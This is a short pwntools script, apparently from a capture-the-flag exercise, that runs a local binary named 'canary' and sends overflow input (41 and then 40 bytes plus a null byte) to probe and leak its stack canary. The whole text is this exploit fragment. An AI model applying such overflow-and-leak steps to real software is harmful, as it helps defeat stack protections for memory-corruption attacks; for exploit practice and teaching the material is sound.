from pwn import *

context.log_level = 'debug'
r = process('canary')

r.send(b'a'*41)
print (r.recv())

r.send(b'a'*40 + b'\x00')
print (r.recv())
